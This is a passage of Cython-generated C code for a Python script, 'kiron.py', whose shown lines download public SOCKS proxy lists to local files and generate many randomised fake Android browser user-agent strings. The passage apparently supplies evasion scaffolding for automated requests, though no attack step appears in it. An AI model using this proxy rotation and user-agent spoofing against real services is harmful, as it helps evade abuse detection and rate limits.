      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_uno, __pyx_t_2) < 0) __PYX_ERR(0, 39, __pyx_L11_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "kiron.py":40
 * try:
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 *  open('.proxy.txt','w').write(uno)             # <<<<<<<<<<<<<<
 * except:pass
 * for x in range(1000):
 */
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__105, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 40, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_uno); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 40, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "kiron.py":38
 * ###----------[ GET PROXY ]----------###
 * redmi=[]
 * try:             # <<<<<<<<<<<<<<
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 *  open('.proxy.txt','w').write(uno)
 */
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "kiron.py":41
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 *  open('.proxy.txt','w').write(uno)
 * except:pass             # <<<<<<<<<<<<<<
 * for x in range(1000):
 *  rr = random.randint
 */
    /*except:*/ {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L12_exception_handled;
    }
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_1);
    __pyx_L16_try_end:;
  }

  /* "kiron.py":42
 *  open('.proxy.txt','w').write(uno)
 * except:pass
 * for x in range(1000):             # <<<<<<<<<<<<<<
 *  rr = random.randint
 *  rc = random.choice
 */
  for (__pyx_t_11 = 0; __pyx_t_11 < 0x3E8; __pyx_t_11+=1) {
    __pyx_t_7 = __Pyx_PyInt_From_long(__pyx_t_11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_x, __pyx_t_7) < 0) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "kiron.py":43
 * except:pass
 * for x in range(1000):
 *  rr = random.randint             # <<<<<<<<<<<<<<
 *  rc = random.choice
 *  A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_random); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_rr, __pyx_t_2) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "kiron.py":44
 * for x in range(1000):
 *  rr = random.randint
 *  rc = random.choice             # <<<<<<<<<<<<<<
 *  A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 *  B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 44, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_rc, __pyx_t_7) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "kiron.py":45
 *  rr = random.randint
 *  rc = random.choice
 *  A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'             # <<<<<<<<<<<<<<
 *  B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 *  C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 */
    __pyx_t_7 = PyTuple_New(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_12 = 0;
    __pyx_t_13 = 127;
    __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Linux_Android);
    __pyx_t_12 += 28;
    __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Linux_Android);
    PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_Mozilla_5_0_Linux_Android);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__106, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
    __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u_Redmi);
    __pyx_t_12 += 8;
    __Pyx_GIVEREF(__pyx_kp_u_Redmi);
    PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_Redmi);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_rr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__107, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_13;
    __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_2);
    __pyx_t_2 = 0;
    __Pyx_INCREF(__pyx_kp_u_Build_PPR1);
    __pyx_t_12 += 12;
    __Pyx_GIVEREF(__pyx_kp_u_Build_PPR1);
    PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u_Build_PPR1);
    __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_7, 5, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_t_2) < 0) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "kiron.py":46
 *  rc = random.choice
 *  A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 *  B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '             # <<<<<<<<<<<<<<
 *  C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 *  D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__108, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyUnicode_ConcatInPlace(__pyx_t_7, __pyx_kp_u_011_en_us_AppleWebKit_537_36); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_t_2) < 0) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "kiron.py":47
 *  A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 *  B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 *  C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'             # <<<<<<<<<<<<<<
 *  D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 *  se = f'{A}\x1b[38;5;244m{C}{D}'
 */
    __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_12 = 0;
    __pyx_t_13 = 127;
    __Pyx_INCREF(__pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0);
    __pyx_t_12 += 35;
    __Pyx_GIVEREF(__pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0);
    PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0);
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_rr); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
    __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u_136_Mobile_Safari);
    __pyx_t_12 += 18;
    __Pyx_GIVEREF(__pyx_kp_u_136_Mobile_Safari);
    PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_136_Mobile_Safari);
    __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_t_3) < 0) __PYX_ERR(0, 47, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "kiron.py":48
 *  B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 *  C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 *  D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'             # <<<<<<<<<<<<<<
 *  se = f'{A}\x1b[38;5;244m{C}{D}'
 *  if se in redmi:pass
 */
    __pyx_t_3 = PyTuple_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_12 = 0;
    __pyx_t_13 = 127;
    __Pyx_INCREF(__pyx_kp_u_537_36_Puffin_9_7_2);
    __pyx_t_12 += 21;
    __Pyx_GIVEREF(__pyx_kp_u_537_36_Puffin_9_7_2);
    PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_537_36_Puffin_9_7_2);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__86, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 48, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 48, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_13;
    __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
    __Pyx_GIVEREF(__pyx_t_7);
    PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_7);
    __pyx_t_7 = 0;
    __Pyx_INCREF(__pyx_n_u_AP);
    __pyx_t_12 += 2;
    __Pyx_GIVEREF(__pyx_n_u_AP);
    PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_n_u_AP);
    __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_3, 3, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 48, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_D, __pyx_t_7) < 0) __PYX_ERR(0, 48, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "kiron.py":49
 *  C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 *  D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 *  se = f'{A}\x1b[38;5;244m{C}{D}'             # <<<<<<<<<<<<<<
 *  if se in redmi:pass
 *  else:redmi.append(se)
 */
    __pyx_t_7 = PyTuple_New(4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_12 = 0;
    __pyx_t_13 = 127;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_A); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_13;
    __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_2);
    __pyx_t_2 = 0;
    __Pyx_INCREF(__pyx_kp_u_38_5_244m_5);
    __pyx_t_12 += 11;
    __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_5);
    PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_kp_u_38_5_244m_5);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_C); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
    __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_D); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_13;
    __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_7, 4, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_se, __pyx_t_2) < 0) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "kiron.py":50
 *  D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 *  se = f'{A}\x1b[38;5;244m{C}{D}'
 *  if se in redmi:pass             # <<<<<<<<<<<<<<
 *  else:redmi.append(se)
 * try:
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_se); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 50, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_redmi); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 50, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_t_2, __pyx_t_7, Py_EQ)); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 50, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (__pyx_t_4) {
      goto __pyx_L19;
    }

    /* "kiron.py":51
 *  se = f'{A}\x1b[38;5;244m{C}{D}'
 *  if se in redmi:pass
 *  else:redmi.append(se)             # <<<<<<<<<<<<<<
 * try:
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 */
    /*else*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_redmi); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 51, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_se); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_14 = __Pyx_PyObject_Append(__pyx_t_7, __pyx_t_2); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 51, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __pyx_L19:;
  }

  /* "kiron.py":52
 *  if se in redmi:pass
 *  else:redmi.append(se)
 * try:             # <<<<<<<<<<<<<<
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 *   open('socksku.txt','w').write(proxylist)
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_5, &__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    /*try:*/ {

      /* "kiron.py":53
 *  else:redmi.append(se)
 * try:
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text             # <<<<<<<<<<<<<<
 *   open('socksku.txt','w').write(proxylist)
 * except Exception as e:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 53, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__109, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 53, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_proxylist, __pyx_t_7) < 0) __PYX_ERR(0, 53, __pyx_L20_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "kiron.py":54
 * try:
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 *   open('socksku.txt','w').write(proxylist)             # <<<<<<<<<<<<<<
 * except Exception as e:
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')
 */
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__110, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 54, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 54, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_proxylist); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 54, __pyx_L20_error)
